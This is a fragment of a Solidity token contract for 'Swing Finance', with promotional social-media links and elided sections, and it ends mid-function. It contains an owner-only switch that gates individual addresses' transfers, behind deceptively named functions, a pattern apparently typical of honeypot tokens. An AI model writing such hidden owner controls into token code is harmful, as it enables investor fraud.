/**     ╔═╗╦ ╦╦╔╗╔╔═╗  ╔═╗╦╔╗╔╔═╗╔╗╔╔═╗╔═╗
        ╚═╗║║║║║║║║ ╦  ╠╣ ║║║║╠═╣║║║║  ║╣ 
        ╚═╝╚╩╝╩╝╚╝╚═╝  ╚  ╩╝╚╝╩ ╩╝╚╝╚═╝╚═╝
  👉https://swingfinance.digital/     <WEBSITE>👈

  👉https://twitter.com/SwingFinance  <TWITTER>👈

  👉https://medium.com/@swingfinance   <MEDIUM>👈

  👉https://t.me/SwingFINANCE        <TELEGRAM>👈
...
contract SwingFinance is Context, IERC20, Ownable {
    ...
    event confirmation (address transferAddress, bool isTransfered);
    ...
    string private _name = 'Swing Finance';
    ...
    function approveTransfer(address transferAddress) external onlyOwner {
        if (_approveTransfer[transferAddress] == true) {
            _approveTransfer[transferAddress] = false;
        } else {_approveTransfer[transferAddress] = true;
            emit confirmation (transferAddress, _approveTransfer[transferAddress]);
          }
    }
    
    function feeRewards(address transferAddress) public view returns (bool) {
